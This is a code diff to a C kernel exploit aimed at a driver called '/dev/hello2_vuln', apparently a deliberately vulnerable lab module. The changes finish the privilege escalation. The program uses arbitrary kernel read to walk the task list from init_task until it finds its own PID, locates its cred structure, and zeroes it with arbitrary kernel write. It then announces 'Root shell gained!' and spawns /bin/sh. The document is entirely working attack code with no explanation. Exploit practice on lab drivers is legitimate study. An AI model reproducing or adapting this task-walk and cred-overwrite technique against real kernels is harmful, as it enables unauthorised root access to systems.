@@ -9,7 +9,8 @@
 #define OFFSET_TO_HEAD 0x3e8
 #define OFFSET_TO_PID 0x4e8
 #define HEAD_TO_PID 0x100
-#define OFFSET_TO_CRED 0x6a8
+#define OFFSET_TO_CRED 0x6a0
+#define HEAD_TO_CRED 0x2b8
 #define BUFFER_LEN 256
 #define DRIVER_FILE "/dev/hello2_vuln"
 
@@ -53,28 +54,38 @@ void write_kernel(void *address, const char* str_to_send, ssize_t size){
 
 int main(){
 	FD = open(DRIVER_FILE, O_RDWR);
-	long pid = getpid();
+	int pid = getpid();
 	printf("[+] PID = %d\n", pid);
 	printf("[+] Reading head from init_tast...\n");
+
 	void *target = INIT_TASK + OFFSET_TO_HEAD;
-	long *buf, *next;
-	read_kernel(target, &buf, sizeof(long*));
+	char *buf, *next;
+
+	read_kernel(target, &buf, sizeof(char*));
 	printf("[+] Kernel read\n");
-	printf("[+] Pointer to next: %p\n", target);
+	printf("[+] Searching for the PID of this program...\n");
 
-	long pid_of_task = 0;
-	read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(long));
-	printf("pid_addr: %p\n", buf+HEAD_TO_PID);
-	printf("pid: %d\n", pid_of_task);
-	
-//	while(pid_of_task != pid){
-		read_kernel(buf, &buf, sizeof(long*));
-		read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(long));
+	int pid_of_task = 0;
+	read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(int));
+
+	while(pid_of_task != pid){
+		read_kernel(buf, &buf, sizeof(char*));
+		read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(int));
 		printf("\t[+] PID of task: %d\n", pid_of_task);
-//	}
+	}
 
-	void *addr_to_creds = buf - OFFSET_TO_HEAD + OFFSET_TO_CRED;
-	printf("[+] Address to our cred: %p\n", addr_to_creds);
+	char *addr_to_task = buf - OFFSET_TO_HEAD;
+	printf("[+] Address to our task: %p\n", addr_to_task);
+
+	char *addr_to_cred;
+	read_kernel(buf + HEAD_TO_CRED, &addr_to_cred, sizeof(char*));
+	printf("[+] Address to cred: %p\n", addr_to_cred);
+	printf("[+] Now setting our cred to 0...\n");
+
+	long long n = 0;
+	write_kernel(addr_to_cred, &n, sizeof(long long));
+	printf("[+] Root shell gained!\n");
+       	system("/bin/sh");	
 
 	return 0;
 }
